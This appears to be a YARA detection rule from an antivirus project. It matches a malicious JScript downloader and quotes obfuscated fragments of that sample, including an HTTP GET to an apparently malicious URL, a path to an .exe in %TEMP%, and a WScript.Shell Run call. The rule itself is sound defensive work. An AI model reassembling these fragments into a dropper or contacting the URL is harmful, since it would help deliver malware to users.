rule sig_20160328_06b151cb70e8ebe141fd794cc1aa42cd {
  meta:
    description = "datamaliciousorder - file 20160328_06b151cb70e8ebe141fd794cc1aa42cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9f6419c3d094f2e50aee5556d57f5226e35a01636000228d0dac08e2b97c5278"

  strings:
    $x1  = "function Zpojjuznsu() {return Geyek[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"jPJklo5ptVGRKu0W.exe\";};" fullword ascii
    $s2  = "Yxktpejgrr[Qcipvzhk](\"GET\", \"http://baskinandbraw.com/wo8pfd\", false);" fullword ascii
    $s3  = "var Geyek = function Hdivwx() {return WScript[Lcwkqzazr](\"WScript.Shell\");}();" fullword ascii
    $s4  = "do {WScript[Ezstmcxz](Xoqlip() * 11)} while (Yxktpejgrr[\"readystate\"] < 2 * 2);" fullword ascii
    $s5  = "function Uwelrw(Pyjbfb){Geyek[\"Run\"](Pyjbfb, Xodbfuhhvd, Xodbfuhhvd);};" fullword ascii
    $s6  = "function Fnrzzmwq(Xhyleelptb, Mknrubkh){return Xhyleelptb - Mknrubkh;};" fullword ascii
    $s7  = "function Oxuzwl() {return ((Jhcjjiemvn == true) && (Jhcjjiemvn == Sgpuoeom)) ? 1 : Xodbfuhhvd;};" fullword ascii
    $s8  = "var Tgsntuces = false;" fullword ascii
    $s9  = "function Nrmdnerul()" fullword ascii
    $s10 = "var Gkgwbl = new this[\"Date\"]();" fullword ascii
    $s11 = "function Nylnvt(){return Nknkexnn;};" fullword ascii
    $s12 = " while (Kuqclxvsvm){" fullword ascii
    $s13 = "Sgpuoeom = true; " fullword ascii
    $s14 = "var Jhcjjiemvn = false;" fullword ascii
    $s15 = "function Vsxyot(){return Lcwkqzazr;};" fullword ascii
    $s16 = "function Recdlbzdz(Szetzzjzr) {var Dbimlsgmb = (1, 2, 3, 4, 5, Szetzzjzr); return Dbimlsgmb;};" fullword ascii
    $s17 = "return Fnrzzmwq(Bqskg, Pubjwiozil);" fullword ascii
    $s18 = "var Sgpuoeom = false;" fullword ascii
    $s19 = "function Xoqlip(){return 22;};" fullword ascii
    $s20 = "Jhcjjiemvn = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    1 of ($x*) and 4 of them
}